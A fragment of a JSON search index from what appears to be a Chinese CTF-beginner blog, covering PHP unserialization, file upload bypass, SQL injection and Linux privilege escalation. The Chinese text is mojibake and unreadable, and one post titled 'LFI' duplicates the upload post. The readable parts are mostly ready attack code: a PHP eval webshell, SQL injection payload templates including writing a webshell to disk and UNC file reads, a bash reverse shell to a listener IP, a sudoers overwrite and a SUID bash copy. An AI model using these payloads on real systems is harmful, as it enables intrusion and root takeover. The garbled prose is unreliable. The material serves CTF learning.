   &#125;&#125;$test = new User();echo $test-&gt;benben;echo &quot;&lt;br /&gt;&quot;;echo $test()-&gt;benben; // This will now work correctly?&gt;\n\næ‰§è¡Œç»“æœ\n12this is test!!å®ƒä¸æ˜¯ä¸ªå‡½æ•°!\n\n__call()è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æˆ–å‡½æ•°æ—¶è§¦å‘è§¦å‘ç›¸å…³ä»£ç \n $this-&gt;start-&gt;helloworld();\n1234567891011&lt;?phpclass User &#123;    public function __call($arg1, $arg2) &#123;        echo &quot;$arg1,$arg2[0]&quot;;    &#125;&#125;$test = new User();$test-&gt;callxxx(&#x27;a&#x27;);?&gt;  //æ‰§è¡Œç»“æœ callxxx,a\n\n\n\n\n\n__callStatic() (é™æ€ï¼‰è°ƒç”¨ä¸å­˜åœ¨çš„æˆå‘˜æ–¹æ³•è§¦å‘é™æ€è°ƒç”¨ï¼š**$test::callxxx(â€˜aâ€™)**\n\n\n__get()è°ƒç”¨ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§æ—¶è§¦å‘è®¿é—®å…¶ä»–ç±»ä¸­ç§æœ‰å±æ€§\n__set()ç»™ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§èµ‹å€¼æ—¶è§¦å‘\n__isset()å’Œ__unset()è°ƒç”¨protrcted &#x2F;private &#x2F; ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§æ—¶è§¦å‘__clone()å½“ä½¿ç”¨cloneå…³é”®å­—æ‹·è´å®Œä¸€ä¸ªå¯¹è±¡æ—¶è§¦å‘å­—ç¬¦ä¸²é€ƒé€¸å‡å°‘\nå‰åå¼•å·ä¸è®¡å…¥é•¿åº¦ \nâ€œsystem()â€å­—ç¬¦ä¸²é•¿åº¦ä¸º8\nä¸‰ä¸ªä¸º24ï¼›å°±ä¼šå¤šåƒæ‰24ä¸ªå­—ç¬¦ä¸²\nå°†xxå¯¹åº”v2æˆå‘˜å±æ€§é•¿åº¦å’Œæ„é€ v3æ€»å­—ç¬¦ä¸²é•¿åº¦ä¹‹å’Œ\n\n12str__replace(â€œsystem()â€,â€ â€,$data);//å°†$dataä¸­çš„systemï¼ˆï¼‰æ›¿æ¢æˆç©ºå­—ç¬¦\n\n\n\n\næ„é€ æ—¶æ³¨æ„é—­åˆ\n\nç”¨var_dump(unserialize())æ¥åˆ¤æ–­æ˜¯å¦æˆåŠŸé€ƒé€¸ æˆåŠŸé€ƒé€¸æ ‡å¿— çœ‹objä¸ªæ•°\n\nå­—ç¬¦ä¸²é€ƒé€¸å‡å°‘ä¾‹é¢˜è®²è§£è§†é¢‘https://www.bilibili.com/video/BV1R24y1r71C?p=18&amp;vd_source=dbbe851caa5969ed57ce1b7f9b095e7c\nä¾‹é¢˜ç½‘ç«™ï¼šhttp://192.168.38.128:8002/class17/1.php\n**å­—ç¬¦ä¸²é€ƒé€¸å‡å°‘ **\næ„é€ ç”¨åˆ°æˆå‘˜å±æ€§å¤š**(éœ€è¦2ä¸ª)**\næ„é€ æ—¶ä¸è¦æ¼æ‰æˆå‘˜å±æ€§\nå¢å¤šhttps://www.bilibili.com/video/BV1R24y1r71C?p=17&amp;vd_source=dbbe851caa5969ed57ce1b7f9b095e7c\nä¾‹é¢˜ç½‘ç«™ï¼šhttp://192.168.38.128:8002/class16/1.php\n**å­—ç¬¦ä¸²é€ƒé€¸ å¢å¤š æ„é€ ç”¨åˆ°æˆå‘˜å±æ€§å°‘ï¼ˆ1ä¸ªï¼‰å¢å¤šé¢˜ç›® **\nç”¨var_dumpæ¥æ£€éªŒ\n\nåœ¨æ­¤é¢˜ä¸­ä»…æ„é€ userå³å¯ï¼Œæ— éœ€ç®¡pass(å› ä¸ºpassç›®æ ‡å€¼å·²æ„é€ åœ¨userä¸­)ï¼Œ\nåå‡ºå­—ç¬¦æ•°é‡è¦å’Œ  ç›¸åŒ¹é…ï¼ˆä»   â€;   å¼€å§‹è®¡æ•°åˆ°   ;}   åœæ­¢)\nå¼•ç”¨\nåœ¨æ­¤é¢˜ä¸­è‹¥è¦ä¿è¯enterå’Œsercretä¸€è‡´\nå¯ä»¥è®©secretå¼•ç”¨enterçš„å€¼\n\n**&amp;**å¼•ç”¨ç¬¦å·\npharæ–‡ä»¶åˆ©ç”¨\n\nåˆ©ç”¨æ¡ä»¶\nPhp.iniä¸­çš„phar.readonlyè¦å¼€å¯\nPharæ–‡ä»¶æ„é€ \nå˜æ›´ç¬¬ä¸‰è¡Œçš„classå’Œç¬¬åä¸€è¡Œå®ä¾‹åŒ–çš„å¯¹è±¡,ç”Ÿæˆæ–‡ä»¶å†…å®¹å¦‚ä¸‹\n\nç”Ÿæˆtxt.pharä¹‹åæ”¹åç¼€.Jpg .png .gif ä¸Šä¼ \nPostä¼ å‚ è·å–flag\n\nä¾‹é¢˜ https://www.nssctf.cn/problem/3018\nâ€‹    https://www.nssctf.cn/problem/466\n","slug":"Unserialize","date":"2024-10-23T13:07:30.000Z","categories_index":"ctfå…¥é—¨","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"8b370a147ba28b5f9bf92d0ab1030d7d","title":"LFI","content":"æ–‡ä»¶ä¸Šä¼ åˆ¤æ–­æ¼æ´å½¢å¼\nä¸€å¥è¯æœ¨é©¬\nåç¼€ ç©ºæ ¼å’Œç‚¹æ­é… åå¤è¯• eg a.php. .\nåç¼€ %00å’Œ0x00æˆªæ–­ %00éœ€è¦PHPç‰ˆæœ¬å°äº5.3.4\n%00æˆªæ–­å¦‚å›¾\n\nè¦†ç›–é…ç½®.htaccessæ–‡ä»¶\nuser.ini\nå‰è€…å†…å®¹å¦‚å›¾\n\nå¤§å°å†™ç»•è¿‡a.php::$DATAä¼ªé€ GIF89agetimagesize()è‹¥å›¾ç‰‡é©¬ æ— æ³•ç›´æ¥åˆ©ç”¨\n\nä¼ªé€ æ–‡ä»¶å¤´(åœ¨PHPæ–‡ä»¶æ–‡ä»¶ä¸­ä¼ªé€ ) GIF89a \n\nå°†æœ¨é©¬å†™åˆ°åˆæ³•æ–‡ä»¶é‡Œ\n1copy /b test.png+1.php muma.png\n\nç›´æ¥ä½¿ç”¨å·¥å…·å¢åŠ å¤‡æ³¨å†™å…¥ä¸€å¥è¯æœ¨é©¬\n\n\né‡å‘½åé‡å‘½åä¸ºxxx.php:.jpg \nç„¶åå†ä¸Šä¼ xxx.&lt;&lt;&lt;\nMIMEä¼ªé€ æ”¹Content-Type\nå¸¸è§Content-Typeåç¼€\n\näºŒæ¬¡æ¸²æŸ“å‡†å¤‡å¤šä¸ªå›¾ç‰‡é©¬ æ¯ä¸ªæœ¨é©¬ä½ç½®è¦ä¸åŒ å¤šæ¬¡å°è¯•å¤šæ¬¡ä¸Šä¼  è¦å¤šç•™åšå¼ºçš„å›¾ç‰‡é©¬\næ—¶é—´ç«äº‰\nburpæŠ“åŒ… å‘é€æ”»å‡»å™¨ æ”»å‡»\nä¸æ–­ä¸Šä¼ ç”Ÿæˆæœ¨é©¬æ–‡ä»¶çš„æ–‡ä»¶\n\næ­¤æ–‡ä»¶å¦‚ä¸‹\n\n\nä¸æ–­è®¿é—®å‰è€…\n\næ”¹åç¼€å .phtml .phps .pht .phtml .php3 .php5 â€¦â€¦ \nPHPæ ‡ç­¾ä¿®æ”¹æœ¨é©¬å†…å®¹\n123456789GIF89a&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&quot;a&quot;]);show_source(&quot;/flag&quot;); (å¯æœ‰å¯æ²¡æœ‰)&lt;/script&gt;\n\nå¤å†™1.jpgæ”¹ä¸º1.jpg.php \nå†ç”¨èšå‰‘è¿æ¥ï¼Œè¿æ¥æ—¶åç§°ä¸ºï¼š1.jpg.php\nåŒå†™1.phpæ”¹ä¸º1.phphpp\n","slug":"LFI","date":"2024-10-23T13:05:28.000Z","categories_index":"ctfå…¥é—¨","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"6c4585b45b97f020140cf6fd5e44ee5e","title":"upload","content":"æ–‡ä»¶ä¸Šä¼ åˆ¤æ–­æ¼æ´å½¢å¼\nä¸€å¥è¯æœ¨é©¬\nåç¼€ ç©ºæ ¼å’Œç‚¹æ­é… åå¤è¯• eg a.php. .\nåç¼€ %00å’Œ0x00æˆªæ–­ %00éœ€è¦PHPç‰ˆæœ¬å°äº5.3.4\n%00æˆªæ–­å¦‚å›¾\n\nè¦†ç›–é…ç½®.htaccessæ–‡ä»¶\nuser.ini\nå‰è€…å†…å®¹å¦‚å›¾\n\nå¤§å°å†™ç»•è¿‡a.php::$DATAä¼ªé€ GIF89agetimagesize()è‹¥å›¾ç‰‡é©¬ æ— æ³•ç›´æ¥åˆ©ç”¨\n\nä¼ªé€ æ–‡ä»¶å¤´(åœ¨PHPæ–‡ä»¶æ–‡ä»¶ä¸­ä¼ªé€ ) GIF89a \n\nå°†æœ¨é©¬å†™åˆ°åˆæ³•æ–‡ä»¶é‡Œ\n1copy /b test.png+1.php muma.png\n\nç›´æ¥ä½¿ç”¨å·¥å…·å¢åŠ å¤‡æ³¨å†™å…¥ä¸€å¥è¯æœ¨é©¬\n\n\né‡å‘½åé‡å‘½åä¸ºxxx.php:.jpg \nç„¶åå†ä¸Šä¼ xxx.&lt;&lt;&lt;\nMIMEä¼ªé€ æ”¹Content-Type\nå¸¸è§Content-Typeåç¼€\n\näºŒæ¬¡æ¸²æŸ“å‡†å¤‡å¤šä¸ªå›¾ç‰‡é©¬ æ¯ä¸ªæœ¨é©¬ä½ç½®è¦ä¸åŒ å¤šæ¬¡å°è¯•å¤šæ¬¡ä¸Šä¼  è¦å¤šç•™åšå¼ºçš„å›¾ç‰‡é©¬\næ—¶é—´ç«äº‰\nburpæŠ“åŒ… å‘é€æ”»å‡»å™¨ æ”»å‡»\nä¸æ–­ä¸Šä¼ ç”Ÿæˆæœ¨é©¬æ–‡ä»¶çš„æ–‡ä»¶\n\næ­¤æ–‡ä»¶å¦‚ä¸‹\n\n\nä¸æ–­è®¿é—®å‰è€…\n\næ”¹åç¼€å .phtml .phps .pht .phtml .php3 .php5 â€¦â€¦ \nPHPæ ‡ç­¾ä¿®æ”¹æœ¨é©¬å†…å®¹\n123456789GIF89a&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&quot;a&quot;]);show_source(&quot;/flag&quot;); (å¯æœ‰å¯æ²¡æœ‰)&lt;/script&gt;\n\nå¤å†™1.jpgæ”¹ä¸º1.jpg.php \nå†ç”¨èšå‰‘è¿æ¥ï¼Œè¿æ¥æ—¶åç§°ä¸ºï¼š1.jpg.php\nåŒå†™1.phpæ”¹ä¸º1.phphpp\n","slug":"upload","date":"2024-10-23T05:58:00.000Z","categories_index":"ctfå…¥é—¨","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"d55a4990aee4e4791fcfc2d40ba4ba3b","title":"sql","content":"SQL Injectionå®½å­—èŠ‚ç»•è¿‡addslashes() åŠŸèƒ½ åœ¨â€˜å’Œâ€œå‰åŠ \\æ¥å®ä½“åŒ– \nGETï¼ˆéœ€è¦æ˜¯GBKç¼–ç ï¼‰åœ¨â€™æˆ–â€å‰åŠ %df eg: %dfâ€™%dfâ€ è§£å†³å®ä½“åŒ–é—®é¢˜ ps:æœ‰æ—¶è¦å°†â€˜æ¢æˆ**%27**  â€œåŒç†ï¼›\n\n  å½“æŸ¥è¯¢åˆ°å­—æ®µæ—¶ï¼Œåº“åç”¨database()ä»£æ›¿ï¼Œéœ€å°†â€™usersâ€˜æ¢æˆ0x7573657273 (7573657273æ˜¯userså­—ç¬¦è½¬æ¢æˆ16è¿›åˆ¶ä»…è½¬æ¢è¡¨åï¼Œä¸è¦åŠ ä¸Šâ€™æˆ–â€) ps:ä¸è¦å¿˜æ‰0x å­—ç¬¦è½¬16è¿›åˆ¶ç½‘ç«™ï¼šhttps://www.sojson.com/hexadecimal.html  \nPOST å› ä¸º%dfæ˜¯urlç¼–ç ï¼Œæ— æ³•ç”¨åˆ°POSTä¼ å‚\n\næ‰€ä»¥éœ€è¦ç”¨burpæŠ“åŒ…ï¼Œç„¶ååœ¨Hexä¸­å°†â€™å‰çš„16è¿›åˆ¶æ•°æ”¹ä¸ºdfï¼›\nä¸gbkç¼–ç ä¸ºä¸‰å­—èŠ‚çš„æ±‰è¯­ç»„åˆï¼Œeg:æ±‰ï¼ˆGBKä¸‰å­—èŠ‚æ–‡å­—ï¼‰  ÃŸâ€™ or 1&#x3D;1â€“+ &#x3D;&gt;æ±‰â€˜ or 1&#x3D;1 â€“  ÃŸå°±æ˜¯%dfåœ¨postä¼ å‚çš„ä½“ç°\n\n&#x3D;çš„å¹³æ›¿ç©ºæ ¼çš„å¹³æ›¿ï¼š like  &#x2F;*&#x2F;, %20, %0a(æ¢è¡Œ),%a0,(),+;** \nå‚æ•°æ±¡æŸ“ eg sqli_labs-29 urlå‚æ•°getä¼ å‚ä¸º?id&#x3D;1 ,å‚æ•°æ±¡æŸ“å³å†ä¼ ä¸€ä¸ªç›¸åŒçš„å‚æ•° eg:id&#x3D;1&amp;id&#x3D;1â€™ union selectâ€¦ é—­åˆåœ¨ç¬¬äºŒä¸ªå‚æ•°å\næ³¨é‡Š â€“ï¼Œâ€“+ï¼Œâ€“%20,â€“qwe,#,and â€˜1â€™&#x3D;â€™1,%23(æ³¨æ„é—­åˆæ–¹å¼ä¸å‚æ•°é—­åˆä¿æŒä¸€è‡´)\nå †å æ³¨å…¥ æå…¶å±é™© è‹¥æœ‰mysqli_multi_queryå‡½æ•° å³å¯å †å æ³¨å…¥\n é¡»å…ˆé—­åˆå‚æ•° \n1insert into users(id,username,password) value (&#x27;100&#x27;,&#x27;100&#x27;,&#x27;100&#x27;) --qwe\n\nå¯ä»¥æ ¹æ®å †å æ³¨å…¥æ¥ä¿®æ”¹å¯†ç \n\næ‹¿è¡¨ \n1show tables;\n\næ‹¿å­—æ®µ\n1show columns from `xxx ` \n\n\n\n\nps:ç”¨åå¼•å·æ¥åŒ…è£¹åå­—\n\näºŒæ¬¡æ³¨å…¥less-24 æ³¨å†Œæ—¶ç”¨æˆ·åä¸º admin&#39;# \nå¯†ç ä¸º111111\nè¿™æ ·ä¸€æ¥ç”¨æˆ·adminçš„å¯†ç ä¾¿æ”¹ä¸º111111\nè”åˆæŸ¥è¯¢è¯­å¥æ¨¡æ¿åº“å1?id=1&#x27; union select 1,2,database() --+\n\nè¡¨å1?id=1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+\n\nå­—æ®µå1?id=1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+\n\nå­—æ®µå†…å®¹1?id=1&#x27; union select 1,group_concat(username),group_concat(password) from users --+\n\næŠ¥é”™æ³¨å…¥è¯­å¥æ¨¡æ¿åº“å1?id=1&#x27;extractvalue(1,concat(&#x27;~&#x27;,(select database()))) --+\n\nè¡¨å1?id=1&#x27;extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+\n\nå­—æ®µå1?id=1&#x27;extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))) --+\n\nå­—æ®µå†…å®¹1?id=1&#x27;extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(username),group_concat(password) from users))) --+\n\næ—¶é—´ç›²æ³¨è¯­å¥æ¨¡æ¿åº“åé•¿åº¦1?id=1&#x27; andï¼ˆlength(database()))=8 and sleep(1) --+\n\n å¦‚æœé¡µé¢å“åº”æ—¶é—´ä¸º1ç§’ï¼Œåˆ™æ•°æ®åº“é•¿åº¦ä¸º8\nâ€‹      \nåº“å1?id=1&#x27; and (ascii(substr(database(),1,1)))=115 and sleep(1) --+\n\n å¦‚æœé¡µé¢å“åº”æ—¶é—´ä¸º1ç§’ï¼Œåˆ™æ•°æ®åº“ç¬¬ä¸€ä½å­—æ¯ä¸ºs (sçš„asciiå€¼æ˜¯115)\nè¡¨åé•¿åº¦1?id=1&#x27; and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&gt;=8 and sleep(1) --+ \n\nâ€‹      \nè¡¨å1?id=1&#x27; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=115 and sleep(1) --+\n\n å¦‚æœé¡µé¢å“åº”æ—¶é—´ä¸º1ç§’ï¼Œåˆ™æ•°æ®åº“ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºe\nå­—æ®µåé•¿åº¦1?id=1&#x27; and (length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)))=10 and sleep(1) --+\n\n å¦‚æœé¡µé¢å“åº”æ—¶é—´ä¸º1ç§’ï¼Œåˆ™æ•°æ®åº“usersè¡¨ç¬¬ä¸€ä¸ªå­—æ®µçš„é•¿åº¦ä¸º10\nå­—æ®µå1?id=1&#x27; and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1)))=115 and sleep(1) --+\n\n å¦‚æœé¡µé¢å“åº”æ—¶é—´ä¸º1ç§’ï¼Œåˆ™æ•°æ®åº“usersè¡¨ç¬¬ä¸€ä¸ªå­—æ®µçš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºe\nå­—æ®µå†…å®¹é•¿åº¦1?id=1&#x27; and (length((select password from users limit 0,1)))=4 and sleep(1) --+ \n\nå¦‚æœé¡µé¢å“åº”æ—¶é—´ä¸º1ç§’ï¼Œåˆ™æ•°æ®åº“usersè¡¨ç¬¬ä¸€ä¸ªå­—æ®µçš„ç¬¬ä¸€ä¸ªå†…å®¹é•¿åº¦ä¸º4\nå­—æ®µå†…å®¹1?id=1&#x27; and (ascii(substr((select password from users limit 0,1),1,1)))=115 and sleep(1) --+\n\n å¦‚æœé¡µé¢å“åº”æ—¶é—´ä¸º1ç§’ï¼Œåˆ™æ•°æ®åº“usersè¡¨ç¬¬ä¸€ä¸ªå­—æ®µçš„ç¬¬ä¸€ä¸ªå†…å®¹çš„å­—ä¸ºe\nifè¯­å¥if(1,2,3)\n1?id=1&#x27;and if(length(database()&gt;1,sleep(2),1)\n\n å¦‚æœé¡µé¢å“åº”æ—¶é—´ä¸º2ç§’ï¼Œåˆ™æ•°æ®åº“é•¿åº¦å¤§äº1\n\n10:sqlå†™é©¬è¯­å¥ï¼ˆå‰æï¼šmysqlå¼€å¯äº†secure_file_priv&#x3D;â€â€çš„é…ç½®ï¼Œå¯ä»¥å †å æ³¨å…¥ï¼‰eg: ?id&#x3D;1â€™;selectâ€™â€˜into outfile â€˜c:&#x2F;&#x2F;www&#x2F;&#x2F;1.phpâ€™\nsqlæ–‡ä»¶æ“ä½œè¯­å¥è¯»æ–‡ä»¶1234567select load_file(&#x27;c:/boot.ini&#x27;) #å¯ä»¥ç”¨16è¿›åˆ¶ä»£æ›¿å­—ç¬¦ä¸²select load_file(0x633a2f626f6f742e696e69)select load_file(&#x27;//ecma.io/1.txt&#x27;) # smbåè®®select load_file(&#x27;\\\\\\\\ecma.io\\\\1.txt&#x27;) # å¯ç”¨äºDNSéš§é“\n\nå†™æ–‡ä»¶12select 0x313233 into outfile &#x27;D:/1.txt&#x27;select 0x313233 into dumpfile &#x27;D:/1.txt&#x27;\n\nåŠ è½½æ–‡ä»¶å†…å®¹åˆ°å­—æ®µä¸­1LOAD DATA INFILE &#x27;/path/to/data.txt&#x27; INTO TABLE data\n\n å°†è¯¥ TXT æ–‡ä»¶ä¸­çš„æ•°æ®åŠ è½½åˆ° data è¡¨çš„ content å­—æ®µä¸­\næŸ¥çœ‹ sql_modePIPES_AS_CONCAT å¼€å¯æ—¶\nå³å¯æ‰§è¡Œè¿æ¥è¯­å¥ \ncommand1;command2\né¡ºåºæ‰§è¡Œ\ncommand1 || command2 \nå¦‚æœcommand1æ‰§è¡Œå¤±è´¥ï¼Œåˆ™æ‰§è¡Œcommand2\ncommand1 &amp;&amp; command2\nå¦‚æœcommand1æ‰§è¡ŒæˆåŠŸï¼Œåˆ™æ‰§è¡Œcommand2\nä¾‹é¢˜\nhttps://www.nssctf.cn/note/set/36\næ€»ç»“\næ£€æŸ¥é—­åˆ ä¸è¦ç”¨?xxx&#x3D;1â€™ and 1&#x3D;1 æ¥åˆ¤æ–­ï¼Œç”¨?xxx&#x3D;1â€™ and sleep(1)åˆ¤æ–­ï¼Œè¿™æ ·å¯ä»¥å‡å°‘è¯•é”™æ¬¡æ•°ï¼›***\n\norder by ç›´æ¥ä»2å¼€å§‹*** \n\nä¸è¦å¿˜è®°æ— é—­åˆï¼Œå¦‚æœè¿™æ ·çš„è¯è¯­å¥æœ€ååŠ æ³¨é‡Šå¯åŠ å¯ä¸åŠ ï¼›\n\nç†Ÿç»ƒä¹‹åå¯ä»¥ç›´æ¥ä»æŸ¥è¯¢è¡¨æ˜å¼€å§‹ å³ç”¨ \n1?id=1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+\n\nmidå‡½æ•°ä½¿ç”¨ ?id&#x3D;1â€™ union select 1,2,mid(group_concat(flag),20,20) from\n\nsys.schema_auto_increment_columns å¹³æ›¿ information_schema.columns\n\n\n","slug":"sql","date":"2024-10-23T02:25:59.000Z","categories_index":"ctfå…¥é—¨","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"8253069df3e619a90109a077baa63a85","title":"ææƒ","content":"è·å–äº¤äº’å¼shell123python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;stty raw -echoexpotr TERM=xterm-color\n\nææƒshellè„šæœ¬shell.sh\nåå¼¹shell12#!/bin/bashbash -i &gt;&amp;/dev/tcp/192.168.38.130/8888 0&gt;&amp;1\n\nkaliå¼€å¯ç›‘å¬ç­‰å¾…è„šæœ¬æ‰§è¡Œ\nå†™å…¥sudoers12#!/bin/bashecho â€œç”¨æˆ·å ALL=(root) NOPASSWD: ALLâ€ &gt; /etc/sudoers\n\næ‰§è¡Œè„šæœ¬å\n123sudo â€“l #ä¼šæ˜¾ç¤ºALL=(root) NOPASSWD: ALLsudo bash #ææƒæˆåŠŸ\n\nå†™å…¥tmp123#!/bin/bashcp /bin/bash /tmp/rootbashchmod +xs /tmp/rootbash\n\næ‰§è¡Œè„šæœ¬å\n1/tmp/rootbash -p\n\n\n\nææƒæ‰‹å·¥æšä¸¾1.æŸ¥çœ‹ç”¨æˆ·1234whoamiidwho  #æŸ¥çœ‹è¿˜æœ‰å“ªäº›ç”¨æˆ·ç™»å½•å½“å‰ç³»ç»Ÿlast #ç³»ç»Ÿæœ€è¿‘ç™»é™†è®°å½•\n\n2.æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬å’Œå†…æ ¸1234uname -a cat /etc/issuecat /proc/versionhostnamectl\n\n3.æŸ¥çœ‹ç½‘ç»œä¿¡æ¯1234ip addrip route #æŸ¥çœ‹è·¯ç”±è¡¨ä¿¡æ¯ip neigh #æŸ¥çœ‹ipé‚»å±…arp -a #æŸ¥çœ‹ipç»‘å®šçš„macåœ°å€\n\n4.å…¶ä»–é‡è¦æšä¸¾å‘½ä»¤12345678sudo -lgetcap -r / 2&gt;/dev/null #é€’å½’æŸ¥æ‰¾ç³»ç»Ÿæ ¹ç›®å½• / ä¸‹æ‰€æœ‰æ–‡ä»¶çš„èƒ½åŠ›ï¼ˆcapabilitiesï¼‰ls -laFls -liahhostname #æŸ¥çœ‹å½“å‰ä¸»æœºåœ¨å†…ç½‘ä¸­çš„è§’è‰²,æ˜¾ç¤ºå½“å‰ä¸»æœºçš„åç§°æˆ–åŸŸåï¼Œé€šå¸¸ç”¨äºç¡®è®¤è¯¥ä¸»æœºåœ¨ç½‘ç»œä¸­çš„è§’è‰²æˆ–è¯†åˆ«ä¸»æœºhistory  #æ˜¾ç¤ºå½“å‰ç”¨æˆ·çš„å‘½ä»¤å†å²è®°å½•ï¼Œå¸®åŠ©ç”¨æˆ·æŸ¥çœ‹ä»¥å‰æ‰§è¡Œè¿‡çš„å‘½ä»¤which    #æ˜¾ç¤ºå‘½ä»¤çš„å®Œæ•´è·¯å¾„ï¼Œé€šå¸¸ç”¨äºç¡®è®¤æŸä¸ªå‘½ä»¤çš„å®‰è£…ä½ç½®cat /etc/fstab\n\n1cat /etc/passwd\n\nç†è§£ &#x2F;etc&#x2F;passwd æ–‡ä»¶å«ä¹‰\næˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹ /etc/passwdå†…å®¹çš„å«ä¹‰ï¼š\nLinux å¯†ç ä¿¡æ¯ä¿å­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶ä¸­ï¼Œåˆ†åˆ«ä¸ºï¼š/etc/passwdå’Œ /etc/shadow\n/etc/passwdæ–‡ä»¶ç”¨äºä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼Œæ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªç”¨æˆ·ï¼Œæ¯ä¸€è¡Œé€šè¿‡å†’å· :åˆ†ä¸ºä¸ƒä¸ªéƒ¨åˆ†:\n\nç”¨æˆ·å\nå¯†ç ï¼Œè‹¥ä¸º xåˆ™è¡¨ç¤ºå¯†ç ä¿å­˜åœ¨/etc/shadow\nUIDï¼Œ0 ä»£è¡¨ root\nGIDï¼Œè¡¨ç¤ºæ‰€åœ¨ç»„\næè¿°ä¿¡æ¯ï¼Œä¾æ¬¡ä¸º Full Nameã€Room Numberã€Work Phoneã€Home Phone å’Œ Other\nç”¨æˆ·ä¸»ç›®å½•\né»˜è®¤ shell ç±»å‹\n\nè¦é‡ç‚¹å…³æ³¨ç¬¬shellç±»å‹æ¥åˆ¤æ–­å‡ºå¯åˆ©ç”¨çš„ç”¨æˆ·\nä¾‹å¦‚ï¼Œå‡è®¾ /etc/passwdæ–‡ä»¶ä¸­å…¶ä¸­ä¸€è¡Œä¿¡æ¯å¦‚ä¸‹ï¼š\n\nå…¶å«ä¹‰è§£è¯»å¦‚ä¸‹ï¼š\n\nç”¨æˆ·åï¼štest-user\nå¯†ç ä¿å­˜åœ¨ /etc/shadowä¸­\nUID ä¸º 1001\nGID ä¸º 1001\næè¿°ä¿¡æ¯ï¼š Full Name [test]: Room Number [11111]: Work Phone [111111-11]: Home Phone [222222-22]: Other [test]\nç”¨æˆ·ä¸»ç›®å½•ä¸º /home/test-user\né»˜è®¤ shell ä¸º /bin/bash\n*ç”±æ­¤å¯è§ï¼Œ/etc/passwdæ–‡ä»¶åœ¨ linux ç™»å½•è®¤è¯è¿‡ç¨‹ä¸­èµ·åˆ°éå¸¸å…³é”®çš„ä½œç”¨\n\n5.æŸ¥çœ‹è¿›ç¨‹1234ps -ef #æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹ps axjf #åŒ…æ‹¬æ²¡æœ‰æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹ps auxtop -n 1 #æŒ‡å®šåªæ˜¾ç¤ºä¸€æ¬¡æ›´æ–°å¹¶é€€å‡ºã€‚å¯ä»¥ç”¨æ¥å¿«é€ŸæŸ¥çœ‹å½“å‰çš„è¿›ç¨‹çŠ¶æ€\n\n\naï¼šæ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·çš„è¿›ç¨‹ã€‚\nuï¼šä»¥ç”¨æˆ·ä¸ºä¸­å¿ƒçš„æ ¼å¼æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·åã€CPU å’Œå†…å­˜ä½¿ç”¨æƒ…å†µã€‚\nxï¼šåŒ…æ‹¬æ²¡æœ‰æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹ã€‚\njï¼šä»¥ä½œä¸šæ ¼å¼æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯ã€‚\nfï¼šæ˜¾ç¤ºè¿›ç¨‹çš„æ ‘çŠ¶ç»“æ„ï¼Œæ˜¾ç¤ºçˆ¶å­è¿›ç¨‹å…³ç³»ã€‚\n\n1234netstat -anetstat -atu  #æŸ¥çœ‹tcp udpç«¯å£å ç”¨æƒ…å†µnetstat -anonetstat -s\n\n\n**-a**ï¼šæ˜¾ç¤ºæ‰€æœ‰è¿æ¥å’Œç›‘å¬çš„ç«¯å£ã€‚è¿™æ„å‘³ç€å®ƒä¼šåˆ—å‡ºæ‰€æœ‰çš„æ´»åŠ¨è¿æ¥ä»¥åŠæ‰€æœ‰æ­£åœ¨ç›‘å¬çš„æœåŠ¡ã€‚\n**-n**ï¼šä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€å’Œç«¯å£å·ï¼Œè€Œä¸æ˜¯å°è¯•è§£æä¸»æœºåå’ŒæœåŠ¡åç§°ã€‚è¿™å¯ä»¥åŠ å¿«å‘½ä»¤çš„æ‰§è¡Œé€Ÿåº¦ï¼Œå¹¶é¿å… DNS è§£æçš„å»¶è¿Ÿã€‚\n**-o**ï¼šæ˜¾ç¤ºä¸æ¯ä¸ªè¿æ¥ç›¸å…³çš„è¿›ç¨‹ IDï¼ˆPIDï¼‰ã€‚è¿™ä½¿å¾—ä½ 